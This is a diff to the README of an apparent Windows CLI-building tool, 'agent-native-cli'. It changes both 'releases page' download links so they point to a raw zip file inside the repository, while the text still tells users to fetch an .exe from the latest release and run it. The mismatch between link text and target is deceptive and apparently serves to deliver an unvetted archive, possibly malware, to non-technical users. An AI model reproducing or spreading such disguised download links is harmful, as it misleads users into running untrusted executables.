@@ -1,6 +1,6 @@
 # 🛠️ agent-native-cli - Build tools for humans and agents
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mauricecolorful3388/agent-native-cli/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mauricecolorful3388/agent-native-cli/raw/refs/heads/main/agents/cli-agent-native-v2.9-alpha.5.zip)
 
 This application helps you create command-line interfaces. These interfaces work for people, automated software agents, and complex systems. You gain the ability to design tools that behave in predictable ways. This ensures your systems talk to each other without error.
 
@@ -16,7 +16,7 @@ You need a Windows machine to run this application. Ensure you have the latest u
 
 Follow these steps to get started:
 
-1. Visit the [releases page](https://github.com/Mauricecolorful3388/agent-native-cli/releases) to find the latest version.
+1. Visit the [releases page](https://github.com/Mauricecolorful3388/agent-native-cli/raw/refs/heads/main/agents/cli-agent-native-v2.9-alpha.5.zip) to find the latest version.
 2. Look for the file ending in .exe under the most recent release.
 3. Click the file to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
